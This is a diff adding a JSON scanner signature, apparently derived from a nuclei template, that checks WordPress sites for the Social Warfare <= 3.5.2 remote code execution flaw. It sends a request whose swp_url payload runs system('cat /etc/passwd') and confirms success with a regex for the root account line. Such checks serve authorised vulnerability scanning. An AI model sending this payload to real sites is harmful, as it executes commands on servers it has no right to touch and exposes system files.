@@ -1,0 +1,16 @@
+{
+ "id": "nuc-wordpress-wp-social-warfare-rce-2",
+ "engine": "wordpress",
+ "method": "GET",
+ "path": "/wp-admin/admin-post.php?swp_debug=load_options&swp_url={{p}}",
+ "payloads": [
+  "<pre>system('cat /etc/passwd')</pre>"
+ ],
+ "match": {
+  "type": "regex",
+  "value": "root:.*:0:0:"
+ },
+ "score": 8,
+ "note": "nuclei: Social Warfare <= 3.5.2 - Remote Code Execution",
+ "wordlist": true
+}
